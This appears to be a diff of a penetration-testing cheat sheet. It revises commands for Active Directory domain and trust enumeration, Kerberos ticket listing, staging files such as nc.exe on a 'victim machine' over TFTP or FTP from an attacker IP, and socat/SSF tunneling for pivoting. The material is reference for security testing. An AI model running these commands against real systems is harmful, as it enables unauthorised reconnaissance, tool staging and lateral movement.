@@ -61,56 +61,45 @@ nltest /DCLIST:DomainName
 nltest /DCNAME:DomainName
 nltest /DSGETDC:DomainName
 
-# current domain info
+# Get Current Domain Info - Similar to Get-Domain
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
-# domain trusts
+# Get Domain Trust Info - Similar to Get-DomainTrust
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 
-# current forest info
+# View Domain Info
 [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
 
-# get forest trust relationships
+#  View Domain Trust Information
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
 
-# get DCs of a domain
+# View All Domain Controllers
 nltest /dclist:offense.local
 net group "domain controllers" /domain
 
-# get DC for currently authenticated session
-nltest /dsgetdc:offense.local
+# View DC for Current Session
+nltest /dsgetdc:m0chanAD.local
 
-# get domain trusts from cmd shell
+# View Domain Trusts from CMD
 nltest /domain_trusts
 
-# get user info
-nltest /user:"spotless"
-
-# get DC for currently authenticated session
-set l
+# View User Info from CMD
+nltest /user:"m0chan"
 
 # get domain name and DC the user authenticated to
 klist
 
-# get all logon sessions. Includes NTLM authenticated sessions
+# Get All Logged on Sessions, Includes NTLM & Kerberos
 klist sessions
 
-# kerberos tickets for the session
+# View Kerb Tickets
 klist
 
-# cached krbtgt
+# View Cached Krbtgt
 klist tgt
 
 # whoami on older Windows systems
 set u
-
-# Forest information
-[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
-# Domain information
-[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-
-
-Shout out to XTC (vulndev.io) for the above trick.
 ```
 
 
@@ -325,15 +314,10 @@ TFTP
 
 ```powershell
 m0chan Machine
-
 mkdir tftp
-
 atftpd --deamon --port 69 tftp
-
 cp *file* tftp
-
 On victim machine:
-
 tftp -i <[IP]> GET <[FILE]>
 ```
 
@@ -343,17 +327,11 @@ FTP
 
 ```powershell
 echo open <[IP]> 21 > ftp.txt
-
 echo USER demo >> ftp.txt
-
 echo ftp >> ftp.txt
-
 echo bin >> ftp.txt
-
 echo GET nc.exe >> ftp.txt
-
 echo bye >> ftp.txt
-
 ftp -v -n -s:ftp.txt
 ```
 
@@ -1307,22 +1285,18 @@ socat TCP-LISTEN:80,fork TCP:202.54.1.5:80
 
 Secure Sockets Funneling
 
-```
+```powershell
 #https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf
 #git clone https://github.com/securesocketfunneling/ssf.git
 
-./ssfd start Server
-
-./ssf -g -F 1080 -Y 1111 -L 172.19.0.4:2222:10.10.14.3:2222 -L 172.19.0.4:3333:10.10.14.3:3333 10.10.14.3
-
-Massive shout out to 0xdf for explaining this perfectly in his article. Couldn't have done it better myself.
+Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself. 
 ```
 
 
 
 Chisel (Fast TCP Tunnel over HTTP secured by SSH)
 
-```
+```powershell
 #https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html
 ```
 
